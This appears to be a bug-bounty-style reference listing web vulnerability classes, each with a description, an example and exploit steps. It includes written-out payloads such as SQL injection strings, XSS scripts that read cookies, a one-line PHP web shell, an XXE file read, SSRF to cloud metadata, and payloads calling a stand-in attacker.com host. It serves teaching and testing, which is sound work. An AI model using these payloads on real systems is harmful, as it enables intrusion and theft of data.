# Vulnerabilities and Exploitation Examples

## Authentication/Session Management

### 2FA Authentication Bypass
- **Description**: The application allows bypassing the second factor of authentication.
- **Example**: An application accepts a previously used 2FA token.
- **Exploit Steps**:
  1. Log in with valid credentials.
  2. Intercept the 2FA request.
  3. Replay an old valid token to bypass the 2FA challenge.

### Account Enumeration
- **Description**: Usernames can be enumerated via error messages or response times.
- **Example**: Login page shows "Username does not exist" for invalid usernames.
- **Exploit Steps**:
  1. Send multiple login attempts with different usernames.
  2. Observe error messages to identify valid usernames.

### Cookie-related Flaws
- **Description**: Cookies lack essential security attributes like `HttpOnly` or `Secure`.
- **Example**: Session cookies are accessible via JavaScript.
- **Exploit Steps**:
  1. Log in and inspect cookies using browser developer tools.
  2. Verify if cookies are accessible via JavaScript.

### Credential/Session Prediction
- **Description**: Weak algorithms allow prediction of session tokens or credentials.
- **Example**: Session tokens follow a sequential pattern.
- **Exploit Steps**:
  1. Analyze session tokens over multiple logins.
  2. Predict a valid session token and hijack the session.

### Default Credentials (Admin)
- **Description**: Admin accounts use default credentials.
- **Example**: Login with "admin/admin" successfully grants admin access.
- **Exploit Steps**:
  1. Attempt to log in with common default credentials.
  2. Gain admin-level access if defaults are not changed.

### Default Credentials (Non-Admin)
- **Description**: Non-admin accounts use default credentials.
- **Example**: Basic users log in with "user/user" without any setup.
- **Exploit Steps**:
  1. Attempt login using default non-admin credentials.
  2. Access basic user functionality.

### Email/Password Recovery Flaw
- **Description**: Password recovery flow is vulnerable to token prediction or leakage.
- **Example**: Password reset token is predictable.
- **Exploit Steps**:
  1. Trigger a password reset request for a target account.
  2. Predict or brute-force the reset token.
  3. Reset the account password.

### Login Authentication Bypass
- **Description**: Flawed logic allows bypassing authentication mechanisms.
- **Example**: SQL injection bypasses login authentication.
- **Exploit Steps**:
  1. Input `' OR 1=1--` into the username and password fields.
  2. Gain access without valid credentials.

### SSO Authentication Bypass
- **Description**: Flaws in single sign-on implementation allow unauthorized access.
- **Example**: Tampering with SSO token payload bypasses access controls.
- **Exploit Steps**:
  1. Intercept and modify the SSO token to escalate privileges.
  2. Access restricted areas.

### Session Fixation
- **Description**: Session ID remains the same after login, enabling fixation attacks.
- **Example**: Pre-login session ID can be reused post-login.
- **Exploit Steps**:
  1. Obtain a session ID before the victim logs in.
  2. Use the same session ID after the victim logs in.

### Step-Up Authentication Bypass
- **Description**: Multi-factor authentication (step-up) is bypassed due to flawed checks.
- **Example**: Reuse of old tokens bypasses step-up authentication.
- **Exploit Steps**:
  1. Trigger a step-up authentication request.
  2. Replay an old or predictable token to bypass the step-up challenge.

---

## Access Control Violations

### Non-Admin Functions (Read Only)
- **Description**: Basic users can view unauthorized data.
- **Example**: A low-privilege user views other users' personal information.
- **Exploit Steps**:
  1. Alter the user ID in API requests to access another user’s data.
  2. Verify the unauthorized access.

### Non-Admin Functions (Read/Write or Write Only)
- **Description**: Low-privilege users can modify unauthorized data.
- **Example**: A user edits another user’s account details.
- **Exploit Steps**:
  1. Intercept and modify requests to include another user’s ID.
  2. Verify changes in the unauthorized data.

### Admin Functions (Read Only)
- **Description**: Regular users access sensitive admin data.
- **Example**: Non-admin users access the admin dashboard.
- **Exploit Steps**:
  1. Access the admin dashboard URL directly.
  2. View sensitive data without admin credentials.

### Admin Functions (Read/Write or Write Only)
- **Description**: Regular users perform admin-level modifications.
- **Example**: Basic users delete user accounts via admin endpoints.
- **Exploit Steps**:
  1. Intercept and modify requests targeting admin functionalities.
  2. Perform admin-level actions like deleting accounts.

---

## Authorization/Permissions

### File Inclusion (No Execution)
- **Description**: Arbitrary files are included in responses without execution.
- **Example**: `/file?name=../../etc/passwd` returns sensitive files.
- **Exploit Steps**:
  1. Modify the file inclusion parameter to reference sensitive files.
  2. Download the file content.

### Insecure Direct Object Reference (Read Only)
- **Description**: Users access restricted resources via predictable references.
- **Example**: `/api/files/123` reveals unauthorized data.
- **Exploit Steps**:
  1. Increment or change resource IDs in API requests.
  2. Verify access to unauthorized resources.

### Insecure Direct Object Reference (Read/Write)
- **Description**: Users modify restricted resources via predictable references.
- **Example**: `/api/users/123` allows editing another user’s profile.
- **Exploit Steps**:
  1. Alter resource IDs in requests targeting sensitive endpoints.
  2. Confirm unauthorized modifications.

### Path Traversal
- **Description**: Directory traversal attack allows access to sensitive files.
- **Example**: `/download?file=../../etc/passwd` accesses system files.
- **Exploit Steps**:
  1. Use directory traversal sequences in file parameters.
  2. Access sensitive files like `/etc/passwd`.

### SSRF (Full)
- **Description**: Exploiting SSRF to access sensitive internal systems.
- **Example**: SSRF retrieves AWS metadata.
- **Exploit Steps**:
  1. Modify request parameters to access internal services like `169.254.169.254`.
  2. Retrieve sensitive metadata or files.

### SSRF (Limited)
- **Description**: Exploiting SSRF for limited external or local requests.
- **Example**: SSRF pings external services through the application server.
- **Exploit Steps**:
  1. Replace target URL with an external server.
  2. Verify interactions with external services.

---

## Brute Force

### Bypass of Lack of Rate Limiting Protections
- **Description**: The application does not implement rate limiting, allowing rapid automated requests.
- **Example**: Brute-forcing login credentials without encountering account lockout.
- **Exploit Steps**:
  1. Use tools like Hydra or Burp Suite Intruder to send multiple login attempts.
  2. Observe the lack of account lockout or throttling.

### Lack of Rate Limiting Protections
- **Description**: The application lacks protections like CAPTCHA, enabling automated requests.
- **Example**: Submitting repeated requests for password resets.
- **Exploit Steps**:
  1. Automate requests to endpoints like `/password-reset`.
  2. Observe the absence of rate-limiting mechanisms.

### Admin Login Credentials
- **Description**: Brute-forcing admin credentials due to weak or guessable passwords.
- **Example**: Successfully logging in with "admin:password123".
- **Exploit Steps**:
  1. Use a password list to brute force the admin login endpoint.
  2. Verify successful access to admin functionality.

### User Login Credentials
- **Description**: Brute-forcing regular user accounts.
- **Example**: Logging in as a low-privilege user via brute force.
- **Exploit Steps**:
  1. Automate login attempts using common passwords.
  2. Confirm successful login as a regular user.

---

## Cloud Security

### AWS Security Compliance
- **Description**: Misconfigured AWS services exposing sensitive data or access.
- **Example**: An S3 bucket is publicly accessible.
- **Exploit Steps**:
  1. Use tools like `aws-cli` or third-party scanners to list bucket permissions.
  2. Access and download sensitive files.

---

## Content Injection

### CSS Injection
- **Description**: Malicious CSS is injected, altering the appearance or stealing data.
- **Example**: Injecting a script to track user interactions.
- **Exploit Steps**:
  1. Identify vulnerable input fields accepting CSS.
  2. Inject malicious CSS, such as `<style>*{background:url(http://attacker.com)</style>`.

### HTTP Parameter Pollution
- **Description**: Multiple parameters with the same name cause unexpected behavior.
- **Example**: `/search?q=term&q=malicious` bypasses input validation.
- **Exploit Steps**:
  1. Send a request with duplicate parameters.
  2. Observe if the server processes them improperly.

### HTTP Response Splitting (CRLF Injection)
- **Description**: Injecting CRLF sequences to manipulate HTTP headers.
- **Example**: `GET /%0D%0AHeader:malicious` injects headers.
- **Exploit Steps**:
  1. Inject `\r\n` sequences into HTTP parameters.
  2. Observe manipulated responses or headers.

### JSON Injection
- **Description**: Injecting malicious JSON into API requests or responses.
- **Example**: `{ "user": "attacker", "role": "admin" }`.
- **Exploit Steps**:
  1. Identify vulnerable API endpoints processing JSON.
  2. Inject malicious payloads and observe unauthorized actions.

### LDAP Injection
- **Description**: Injecting LDAP statements to manipulate queries.
- **Example**: `*)(|(user=*))` in LDAP search filters bypass authentication.
- **Exploit Steps**:
  1. Test input fields with special characters like `*`, `|`, and `)`.
  2. Observe unauthorized results or access.

### ORM Injection
- **Description**: Injecting malicious payloads into ORM queries.
- **Example**: Bypassing authentication with `' OR 1=1--`.
- **Exploit Steps**:
  1. Analyze ORM-based queries for injectable inputs.
  2. Inject payloads to bypass query constraints.

### Server-Side Includes Injection (SSI)
- **Description**: Injecting SSI directives to execute server-side commands.
- **Example**: `<!--#exec cmd="ls"-->`.
- **Exploit Steps**:
  1. Test input fields or file uploads for SSI injection.
  2. Verify execution of server-side commands.

### Spoof HTML Content
- **Description**: Modifying legitimate pages to display malicious content.
- **Example**: Changing a login page to redirect credentials.
- **Exploit Steps**:
  1. Insert spoofed HTML into vulnerable input fields.
  2. Observe how the content appears to users.

### XXE (Full)
- **Description**: Full XML External Entity exploitation allows file read or network interactions.
- **Example**: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`.
- **Exploit Steps**:
  1. Submit an XML payload with an external entity.
  2. Observe server response for sensitive data.

### XXE (Limited)
- **Description**: Limited XXE allows only basic entity resolution.
- **Example**: Including external resources like `http://attacker.com`.
- **Exploit Steps**:
  1. Inject XML with external entities.
  2. Monitor outbound requests from the server.

### XPath/XQuery Injection
- **Description**: Manipulating XPath queries to retrieve unauthorized data.
- **Example**: `username[.="admin" or "1=1"]`.
- **Exploit Steps**:
  1. Test input fields with special characters used in XPath.
  2. Extract unauthorized information from XML data.

---

## Cross-Site Scripting (XSS)

### Blind XSS
- **Description**: Payloads trigger XSS in environments you cannot directly observe.
- **Example**: Injecting `<script>alert(document.cookie)</script>` into logs.
- **Exploit Steps**:
  1. Inject XSS payloads into input fields stored server-side.
  2. Use out-of-band tools like Burp Collaborator to capture execution.

### Cross-Site Scripting Inclusion (XSSI)
- **Description**: Including malicious scripts from external sources.
- **Example**: `<script src="http://attacker.com/malicious.js"></script>`.
- **Exploit Steps**:
  1. Host a malicious script on your server.
  2. Include the script via vulnerable parameters.

### DOM-based XSS
- **Description**: Client-side JavaScript processes attacker-controlled input unsafely.
- **Example**: `document.write(location.hash)` with a malicious hash.
- **Exploit Steps**:
  1. Identify DOM sinks like `innerHTML`.
  2. Craft a malicious payload in the URL fragment.

### Persistent XSS
- **Description**: Malicious scripts are stored on the server and executed by users.
- **Example**: Injecting `<script>alert(1)</script>` into user profiles.
- **Exploit Steps**:
  1. Inject the payload into fields that persist data.
  2. Trigger the payload by visiting the affected page.

### Reflected XSS
- **Description**: Malicious input is reflected in the server's response.
- **Example**: `search?q=<script>alert(1)</script>` renders the script.
- **Exploit Steps**:
  1. Test input fields with basic XSS payloads.
  2. Confirm script execution in the server response.

### Reflected-DOM XSS
- **Description**: Reflected data is used by client-side JavaScript in an unsafe way.
- **Example**: `search?q=alert(1)` reflected into a JavaScript sink.
- **Exploit Steps**:
  1. Identify reflected data in JavaScript variables.
  2. Inject payloads to exploit the vulnerable sink.

---

## Cross-Site Request Forgery (CSRF)

### High Impact
- **Description**: CSRF exploits result in significant changes affecting multiple users or sensitive data.
- **Example**: Changing an account email address to allow account takeover.
- **Exploit Steps**:
  1. Create a malicious HTML form that submits a forged request.
  2. Host the form on a malicious site and trick the victim into visiting it.
  3. Observe the changes on the target application.

### Low Impact
- **Description**: CSRF exploits have minor effects with no significant security impact.
- **Example**: Changing a user’s display name or profile picture.
- **Exploit Steps**:
  1. Create a CSRF payload targeting a low-impact action.
  2. Host the payload and send the victim to the page.
  3. Verify the minor changes on the victim's account.

---

## Cryptography

### Cryptography Implementation Flaw
- **Description**: Errors in cryptographic implementation, such as weak key generation or flawed algorithms.
- **Example**: Using ECB mode for AES encryption, leading to predictable ciphertext.
- **Exploit Steps**:
  1. Analyze encrypted data for patterns (e.g., repeated blocks in ciphertext).
  2. Use cryptanalysis techniques to extract sensitive information.

### Encrypted Information Compromised
- **Description**: Encrypted sensitive data is leaked or improperly secured.
- **Example**: Discovering encrypted passwords in a public GitHub repository.
- **Exploit Steps**:
  1. Locate the leaked encrypted data.
  2. Attempt decryption using known keys, brute force, or dictionary attacks.

### Weak Ciphers Used for Encryption
- **Description**: Usage of outdated or insecure encryption algorithms.
- **Example**: Observing TLS communication using RC4.
- **Exploit Steps**:
  1. Use tools like Wireshark to capture encrypted traffic.
  2. Analyze the protocol and cipher suite in use.

---

## Denial-of-Service (DoS)

### DoS against a specific server service
- **Description**: Overloading a specific service to cause unavailability.
- **Example**: Flooding an API endpoint with thousands of requests.
- **Exploit Steps**:
  1. Identify vulnerable endpoints or services.
  2. Use tools like `hping3` or `LOIC` to send a large number of requests.
  3. Monitor for downtime or resource exhaustion.

### DoS against a specific user
- **Description**: Targeting an individual user to deny them access.
- **Example**: Exploiting session management to lock a user’s account.
- **Exploit Steps**:
  1. Identify an action that can exhaust a user’s session or lock their account.
  2. Automate requests using tools like Burp Suite Intruder.
  3. Observe the impact on the user’s ability to access the service.

---

## Dependency Confusion

### Dependency Confusion
- **Description**: Injecting malicious dependencies into applications using package managers.
- **Example**: Publishing a package named `internal-package` to public npm or PyPI.
- **Exploit Steps**:
  1. Identify internal package names used in the target application.
  2. Create a malicious package with the same name and host it publicly.
  3. Wait for the application to download and execute the malicious package.

---

## Functional/Business Logic

### Client Side Validation
- **Description**: Critical validation checks performed only on the client side.
- **Example**: Disabling client-side JavaScript to bypass form validation.
- **Exploit Steps**:
  1. Disable JavaScript or intercept the request using a proxy tool.
  2. Submit invalid or malicious data directly to the server.
  3. Observe how the server processes the data without validation.

### Functionality Abuse with Malicious Impact
- **Description**: Misusing legitimate features to achieve unintended consequences.
- **Example**: Exploiting referral discounts by self-referring multiple times.
- **Exploit Steps**:
  1. Identify a functionality that can be abused.
  2. Automate the process using tools like Selenium or scripts.
  3. Observe unintended benefits or impacts.

### Improper Input Validation
- **Description**: Failure to validate user input adequately, leading to exploitation.
- **Example**: Injecting malicious characters into an input field.
- **Exploit Steps**:
  1. Test input fields with special characters or malicious payloads.
  2. Observe server responses or application behavior for anomalies.

### Insecure Deserialization
- **Description**: Exploiting deserialization of untrusted data to execute malicious code.
- **Example**: Crafting a malicious serialized object for an application using Java.
- **Exploit Steps**:
  1. Identify endpoints deserializing user-controlled data.
  2. Craft a payload using tools like `ysoserial`.
  3. Submit the payload and observe the execution of malicious code.

### Unrestricted File Upload (No Execution)
- **Description**: Uploading unauthorized file types without execution.
- **Example**: Uploading `.exe` files to a document management system.
- **Exploit Steps**:
  1. Identify file upload functionality.
  2. Upload files of various types and sizes.
  3. Verify if the files can be downloaded unmodified.

### Unvalidated Redirect Bypass
- **Description**: Redirecting users to malicious sites without validation.
- **Example**: Injecting `https://attacker.com` into a redirect parameter.
- **Exploit Steps**:
  1. Test redirect endpoints with external URLs.
  2. Observe if the application redirects without validation.

### Unvalidated Redirects
- **Description**: Redirecting users to unintended destinations.
- **Example**: Using `next` parameters to redirect users to `http://attacker.com`.
- **Exploit Steps**:
  1. Identify redirect endpoints with parameters like `?redirect=`.
  2. Test with arbitrary URLs and observe behavior.

---

## Information Disclosure

### Directory Contents Disclosed
- **Description**: Sensitive directory contents are exposed to unauthorized users.
- **Example**: Accessing `http://example.com/.git/` reveals repository contents.
- **Exploit Steps**:
  1. Enumerate directories using tools like `gobuster` or `dirb`.
  2. Access exposed directories and review their contents.

### Directory Structure Enumeration
- **Description**: Revealing directory structure information that may aid attackers.
- **Example**: A `403 Forbidden` response shows the path `/var/www/html/secure/`.
- **Exploit Steps**:
  1. Use path traversal payloads or scanners to discover hidden paths.
  2. Analyze server responses for directory hints.

### Identity of Network Topology
- **Description**: Revealing internal network architecture and IP addresses.
- **Example**: Debug information leaks internal IP `10.0.0.1`.
- **Exploit Steps**:
  1. Check error messages or verbose server responses.
  2. Extract and map the network details provided.

### Identity of Software Architecture
- **Description**: Leaking server-side software frameworks or versions.
- **Example**: A `Server` header shows `Apache/2.4.41`.
- **Exploit Steps**:
  1. Inspect HTTP headers using tools like `Burp Suite`.
  2. Verify exposed version details for known vulnerabilities.

### Leaked Credentials (High Privilege)
- **Description**: High-privilege credentials like admin or database accounts are exposed.
- **Example**: Admin credentials found in source code.
- **Exploit Steps**:
  1. Search exposed files for credentials using terms like `username=` or `password=`.
  2. Validate the credentials on in-scope systems.

### Leaked Credentials (Low Privilege)
- **Description**: Basic user credentials are exposed.
- **Example**: Hardcoded test user credentials in a client-side JavaScript file.
- **Exploit Steps**:
  1. Review client-side files for hardcoded credentials.
  2. Test the credentials for access to in-scope systems.

### Sensitive API Keys
- **Description**: Exposure of API keys with high impact.
- **Example**: A public repository contains an AWS key with full permissions.
- **Exploit Steps**:
  1. Search public repositories or files for keys using tools like `trufflehog`.
  2. Test the keys for access to sensitive systems or data.

### Sensitive Client Information Disclosed
- **Description**: Exposure of sensitive client-specific information.
- **Example**: Accessing customer PII in logs or error messages.
- **Exploit Steps**:
  1. Monitor error responses or debug logs.
  2. Extract and validate sensitive client data.

### Sensitive Directory/File Contents Disclosed
- **Description**: Unintended exposure of file or directory contents.
- **Example**: Accessing `http://example.com/backup.zip` containing sensitive data.
- **Exploit Steps**:
  1. Scan for exposed files using tools like `gobuster`.
  2. Analyze downloaded files for sensitive information.

### Sensitive Information Leak to Third-Parties
- **Description**: Information leaked to third-party domains unintentionally.
- **Example**: Referrer headers revealing sensitive paths to external analytics services.
- **Exploit Steps**:
  1. Observe outgoing requests to third-party services.
  2. Analyze headers or payloads for leaked information.

### Sensitive Source Code
- **Description**: Unintended exposure of source code.
- **Example**: Accessing `http://example.com/source.php` displays PHP code.
- **Exploit Steps**:
  1. Scan for file extensions like `.php`, `.aspx`, `.java`.
  2. Review exposed code for sensitive logic or credentials.

### Service Version Disclosed
- **Description**: Exposing software service versions that may aid exploitation.
- **Example**: `nginx/1.19.6` displayed in the `Server` HTTP header.
- **Exploit Steps**:
  1. Use tools like `nmap` or `curl` to enumerate version details.
  2. Research known vulnerabilities for the disclosed version.

### Software Version Disclosed
- **Description**: Revealing outdated or vulnerable software versions.
- **Example**: The `X-Powered-By` header shows `PHP/5.4.45`.
- **Exploit Steps**:
  1. Inspect HTTP headers or meta tags.
  2. Research vulnerabilities for the identified version.

---

## Remote Code Execution (RCE)

### Remote Code Execution
- **Description**: Exploiting vulnerabilities to execute arbitrary code on the server.
- **Example**: Uploading and executing a malicious PHP shell.
- **Exploit Steps**:
  1. Identify an input vector (e.g., file upload or command execution endpoint).
  2. Submit a payload like `<?php system($_GET['cmd']); ?>`.
  3. Access the payload and execute commands using query parameters.

---

## SQL Injection (SQLi)

### SQL Injection (Full)
- **Description**: Exploiting SQL queries to extract sensitive data or bypass authentication.
- **Example**: Using `' OR 1=1 --` to bypass login authentication.
- **Exploit Steps**:
  1. Test inputs with payloads like `' OR '1'='1`.
  2. Enumerate database tables and columns using SQL commands.
  3. Extract sensitive data like usernames and passwords.

### SQL Injection (Partial)
- **Description**: Exploiting SQL queries to infer database structure or delay responses.
- **Example**: Using `AND SLEEP(5)` to confirm a vulnerability.
- **Exploit Steps**:
  1. Submit payloads like `AND 1=1` and observe behavior.
  2. Use time-based payloads to infer the database backend.
  3. Confirm injection points for further exploitation.

---

## Server/Application Misconfiguration

### Application Level Protection
- **Description**: Missing or improperly configured protections at the application level.
- **Example**: Disabling CSRF tokens on sensitive forms.
- **Exploit Steps**:
  1. Analyze requests for missing protection mechanisms.
  2. Exploit the misconfiguration using a CSRF payload.

### Cache Directives
- **Description**: Improper caching of sensitive data.
- **Example**: Viewing another user’s sensitive data cached in a shared browser.
- **Exploit Steps**:
  1. Analyze cache-related headers in server responses.
  2. Test for unintended cache behaviors with different user sessions.

### Cache Poisoning
- **Description**: Poisoning cache entries to serve malicious content.
- **Example**: Injecting a malicious payload into a cacheable response.
- **Exploit Steps**:
  1. Craft requests that trigger caching mechanisms.
  2. Observe cached responses for malicious payload persistence.

### Cross-Origin Resource Sharing (CORS)
- **Description**: Misconfigured CORS policies allowing unauthorized access.
- **Example**: Allowing `*` in `Access-Control-Allow-Origin`.
- **Exploit Steps**:
  1. Send cross-origin requests using malicious domains.
  2. Access sensitive data from the target application.

---

## Server/Application Misconfiguration (Continued)

### DNS Misconfiguration
- **Description**: Misconfigured DNS settings exposing internal records or enabling attacks.
- **Example**: An open DNS resolver allowing DNS amplification attacks.
- **Exploit Steps**:
  1. Use tools like `dig` or `nslookup` to enumerate DNS records.
  2. Identify exposed internal records or test for open resolver vulnerabilities.

### External Service Interaction
- **Description**: Unintended interaction with external services.
- **Example**: SSRF vulnerability allowing interaction with external endpoints.
- **Exploit Steps**:
  1. Identify endpoints that trigger external interactions.
  2. Craft requests to interact with external systems, such as DNS callbacks.

### HTTP Request/Response Smuggling
- **Description**: Manipulating HTTP requests to bypass security controls or poison caches.
- **Example**: Injecting CRLF sequences in headers to split HTTP requests.
- **Exploit Steps**:
  1. Send malformed requests with overlapping Content-Length headers.
  2. Observe responses for signs of smuggling, such as split responses.

### Host Level Protection
- **Description**: Misconfigurations at the host level allowing unauthorized actions.
- **Example**: Unrestricted access to admin dashboards via IP whitelisting issues.
- **Exploit Steps**:
  1. Enumerate endpoints or services for host-level access.
  2. Test IP-based restrictions or bypass mechanisms.

### Improper Filesystem Permissions
- **Description**: Files or directories with overly permissive access controls.
- **Example**: `/var/www/html/uploads` is writable by all users.
- **Exploit Steps**:
  1. Enumerate file permissions using tools like `ls -la`.
  2. Exploit writable directories to upload malicious files.

### Insecure Data Storage
- **Description**: Storing sensitive data insecurely, such as plaintext passwords.
- **Example**: User credentials stored in plaintext in a database.
- **Exploit Steps**:
  1. Identify data storage mechanisms (e.g., databases or logs).
  2. Access and analyze stored data for security misconfigurations.

### Open Mail Relay
- **Description**: Mail servers configured to relay emails to unauthorized domains.
- **Example**: Sending emails through a misconfigured SMTP server to external domains.
- **Exploit Steps**:
  1. Test the SMTP server for relaying capabilities using tools like `swaks`.
  2. Confirm unauthorized email delivery to external addresses.

### Root/Jailbreak Detection Bypass
- **Description**: Bypassing security mechanisms detecting rooted or jailbroken devices.
- **Example**: Patching binaries to bypass root detection checks.
- **Exploit Steps**:
  1. Analyze the application's detection methods (e.g., API calls).
  2. Use tools like Frida to hook or bypass detection logic.

### SSL Pinning Bypass
- **Description**: Bypassing SSL pinning mechanisms to intercept encrypted traffic.
- **Example**: Patching the application to accept custom certificates.
- **Exploit Steps**:
  1. Analyze the application's SSL pinning implementation.
  2. Use tools like Frida or objection to bypass pinning checks.

### Security HTTP Headers
- **Description**: Missing or misconfigured HTTP security headers.
- **Example**: Lack of `Content-Security-Policy` headers.
- **Exploit Steps**:
  1. Inspect HTTP responses for missing headers using tools like `Burp Suite`.
  2. Demonstrate potential attacks, such as XSS, due to missing headers.

### DNS Zone/Subdomain Takeover
- **Description**: Taking over unclaimed subdomains due to DNS misconfigurations.
- **Example**: Subdomain points to a deleted AWS bucket.
- **Exploit Steps**:
  1. Identify subdomains with unclaimed resources using tools like `subjack`.
  2. Register the unclaimed resource and demonstrate control.

### UI Redressing/Clickjacking
- **Description**: Tricking users into performing unintended actions via hidden UI elements.
- **Example**: Framing a login page to steal credentials.
- **Exploit Steps**:
  1. Create a malicious iframe pointing to the target application.
  2. Craft a payload that forces user interaction with the hidden elements.

### Unclaimed Domain in Use
- **Description**: Using an unregistered domain previously associated with the target.
- **Example**: A domain for sending emails is unregistered and can be re-acquired.
- **Exploit Steps**:
  1. Enumerate domains associated with the target.
  2. Register unclaimed domains and demonstrate potential abuse, like phishing.

### Using Known Vulnerable Software
- **Description**: Using software with publicly known vulnerabilities.
- **Example**: Running `Apache Struts 2.3.15` vulnerable to RCE.
- **Exploit Steps**:
  1. Enumerate software versions using tools like `nmap` or `banner grabbing`.
  2. Match versions with known CVEs and demonstrate exploitation.

---

## Other

### Other
- **Description**: Vulnerabilities that do not fit into predefined categories.
- **Example**: Logic flaws or unique misconfigurations not covered elsewhere.
- **Exploit Steps**:
  1. Clearly describe the issue and its impact.
  2. Provide detailed steps for reproduction and evidence of exploitation.

